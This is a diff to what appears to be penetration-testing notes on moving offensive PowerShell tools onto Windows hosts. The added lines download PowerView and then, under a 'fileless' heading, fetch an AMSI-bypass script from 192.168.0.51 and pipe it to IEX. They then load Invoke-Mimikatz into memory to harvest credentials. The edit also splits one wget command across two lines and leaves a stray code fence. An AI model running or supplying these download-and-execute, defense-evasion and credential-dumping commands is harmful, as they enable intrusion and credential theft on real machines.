@@ -38,13 +38,28 @@ Malicious files can be detected by Defender:
 
 ```bash
 PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
-PS C:\users\public\downloads> wget 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_wget.ps1
+
+PS C:\users\public\downloads> wget 
+'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_wget.ps1
+
 PS C:\users\public\downloads> curl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -o PowerView_curl.ps1
 ```
 
-### Web Downloads - Fileless
+### Web Downloads - Fileless (memory)
+
+Need to bypass AMSI to load Malicious files into memory:
 
 ```bash
+PS C:\Users\Sec-1> (New-Object System.Net.WebClient).DownloadString('http://192.168.0.51/amsi.txt') | IEX
+```
+
+Then load into memory:
+
+```bash
+PS C:\users\public\downloads> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+
+PS C:\users\public\downloads> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+```
 
 ```
 
